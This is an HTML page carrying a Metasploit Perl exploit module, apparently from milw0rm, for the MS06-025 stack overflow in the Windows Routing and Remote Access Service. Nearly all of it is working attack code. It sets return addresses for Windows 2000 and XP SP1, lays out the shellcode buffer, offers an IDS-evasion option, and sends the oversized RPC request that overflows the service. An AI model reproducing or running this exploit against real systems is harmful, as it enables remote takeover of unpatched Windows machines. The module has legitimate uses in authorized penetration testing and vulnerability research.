<html><head><title>MS Windows RRAS Remote Stack Overflow Exploit (MS06-025)</title></head><pre>
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::rras_ms06_025;
use base &quot;Msf::Exploit&quot;;
use strict;

use Pex::DCERPC;
use Pex::NDR;

my $advanced = {
	'FragSize'    =&gt; [ 256, 'The DCERPC fragment size' ],
	'BindEvasion' =&gt; [ 0,   'IDS Evasion of the Bind request' ],
	'DirectSMB'   =&gt; [ 0,   'Use direct SMB (445/tcp)' ],
  };

my $info = {
	'Name'    =&gt; 'Microsoft RRAS MSO6-025 Stack Overflow',
	'Version' =&gt; '$Revision: 1.1 $',
	'Authors' =&gt; 
	[ 
		'Nicolas Pouvesle &lt;nicolas.pouvesle [at] gmail.com&gt;',
		'H D Moore &lt;hdm [at] metasploit.com&gt;'
	],

	'Arch' =&gt; ['x86'],
	'OS'   =&gt; [ 'win32', 'win2000', 'winxp' ],
	'Priv' =&gt; 1,

	'AutoOpts' =&gt; { 'EXITFUNC' =&gt; 'thread' },
	'UserOpts' =&gt; {
		'RHOST' =&gt; [ 1, 'ADDR', 'The target address' ],

		# SMB connection options
		'SMBUSER' =&gt; [ 0, 'DATA', 'The SMB username to connect with', '' ],
		'SMBPASS' =&gt; [ 0, 'DATA', 'The password for specified SMB username',''],
		'SMBDOM'  =&gt; [ 0, 'DATA', 'The domain for specified SMB username', '' ],
		'SMBPIPE' =&gt; [ 1, 'DATA', 'The pipe name to use (2000=ROUTER, XP=SRVSVC)', 'ROUTER' ],
	  },

	'Payload' =&gt; {
		'Space'    =&gt; 1104,
		'BadChars' =&gt; &quot;\x00&quot;,
		'Keys'     =&gt; ['+ws2ord'],

		# sub esp, 4097 + inc esp makes stack happy
		'Prepend' =&gt; &quot;\x81\xc4\xff\xef\xff\xff\x44&quot;,
	  },

	'Description' =&gt; Pex::Text::Freeform(
		qq{
        This module exploits a stack overflow in the Windows Routing and Remote
		Access Service. Since the service is hosted inside svchost.exe, a failed 
		exploit attempt can cause other system services to fail as well. A valid
		username and password is required to exploit this flaw on Windows 2000. 
		When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'.
}
	  ),

	'Refs' =&gt;
	  [
		[ 'BID', '18325' ],
		[ 'CVE', '2006-2370' ],
		[ 'OSVDB', '26437' ],
		[ 'MSB', 'MS06-025' ]
	  ],

	'DefaultTarget' =&gt; 0,
	'Targets'       =&gt;
	  [
		[ 'Automatic' ],
		[ 'Windows 2000',   0x7571c1e4 ], # pop/pop/ret
		[ 'Windows XP SP1', 0x7248d4cc ], # pop/pop/ret
	  ],

	'Keys' =&gt; ['rras'],

	'DisclosureDate' =&gt; 'Jun 13 2006',
  };

sub new {
	my ($class) = @_;
	my $self    = $class-&gt;SUPER::new( { 'Info' =&gt; $info, 'Advanced' =&gt; $advanced }, @_ );
	return ($self);
}

sub Exploit {
	my ($self)      = @_;
	my $target_host = $self-&gt;GetVar('RHOST');
	my $target_port = $self-&gt;GetVar('RPORT');
	my $target_idx  = $self-&gt;GetVar('TARGET');
	my $shellcode   = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
	my $target      = $self-&gt;Targets-&gt;[$target_idx];

	my $FragSize = $self-&gt;GetVar('FragSize') || 256;
	my $target   = $self-&gt;Targets-&gt;[$target_idx];

	my ( $res, $rpc );

	if ( !$self-&gt;InitNops(128) ) {
		$self-&gt;PrintLine(&quot;[*] Failed to initialize the nop module.&quot;);
		return;
	}

	my $pipe    = &quot;\\&quot; . $self-&gt;GetVar(&quot;SMBPIPE&quot;);
	my $uuid    = '20610036-fa22-11cf-9823-00a0c911e5df';
	my $version = '1.0';

	my $handle =
	  Pex::DCERPC::build_handle( $uuid, $version, 'ncacn_np', $target_host,
		$pipe );

	my $dce = Pex::DCERPC-&gt;new(
		'handle'      =&gt; $handle,
		'username'    =&gt; $self-&gt;GetVar('SMBUSER'),
		'password'    =&gt; $self-&gt;GetVar('SMBPASS'),
		'domain'      =&gt; $self-&gt;GetVar('SMBDOM'),
		'fragsize'    =&gt; $self-&gt;GetVar('FragSize'),
		'bindevasion' =&gt; $self-&gt;GetVar('BindEvasion'),
		'directsmb'   =&gt; $self-&gt;GetVar('DirectSMB'),
	  );

	if ( !$dce ) {
		$self-&gt;PrintLine(&quot;[*] Could not bind to $handle&quot;);
		return;
	}

	my $smb = $dce-&gt;{'_handles'}{$handle}{'connection'};
	if ( $target-&gt;[0] =~ /Auto/ ) {
		if ( $smb-&gt;PeerNativeOS eq 'Windows 5.0' ) {
			$target = $self-&gt;Targets-&gt;[1];
			$self-&gt;PrintLine('[*] Detected a Windows 2000 target...');
		}
		elsif ( $smb-&gt;PeerNativeOS eq 'Windows 5.1' ) {
			$target = $self-&gt;Targets-&gt;[2];
			$self-&gt;PrintLine('[*] Detected a Windows XP target...');
		}
		else {
			$self-&gt;PrintLine( '[*] No target available : ' . $smb-&gt;PeerNativeOS() );
			return;
		}
	}

	my $pattern = '';

	if ($target-&gt;[0] =~ /Windows 2000/) {

		$pattern =
		  pack( 'V', 1 ) .
		  pack( 'V', 0x49 ) .
		  $shellcode .
		  &quot;\xeb\x06&quot; .
		  Pex::Text::AlphaNumText(2).
		  pack( 'V', $target-&gt;[1] ) .
		  &quot;\xe9\xb7\xfb\xff\xff&quot; ;

	} elsif( $target-&gt;[0] =~ /Windows XP/) {

		$pattern =
		  pack( 'V', 1 ) .
		  pack( 'V', 0x49 ) .
		  Pex::Text::AlphaNumText(0x4c).
		  &quot;\xeb\x06&quot; .
		  Pex::Text::AlphaNumText(2).
		  pack( 'V', $target-&gt;[1] ) .
		  $shellcode;

	} else {
		self-&gt;PrintLine( '[*] No target available...');
		return;
	}

	# need to produce an exception
	my $request = $pattern . Pex::Text::AlphaNumText(0x4000 - length($pattern));

	my $len = length ($request);

	my $stub =
	  Pex::NDR::Long( int( 0x20000 ) )
	  . Pex::NDR::Long( int( $len ) )
	  . $request
	  . Pex::NDR::Long( int( $len ) );

	$self-&gt;PrintLine(&quot;[*] Sending request...&quot;);
	my @response = $dce-&gt;request( $handle, 0x0C, $stub );
	if (@response) {
		$self-&gt;PrintLine('[*] RPC server responded with:');
		foreach my $line (@response) {
			$self-&gt;PrintLine( '[*] ' . $line );
		}
		$self-&gt;PrintLine('[*] This probably means that the system is patched');
	}
	return;
}

1;

# milw0rm.com [2006-06-22]</pre></html>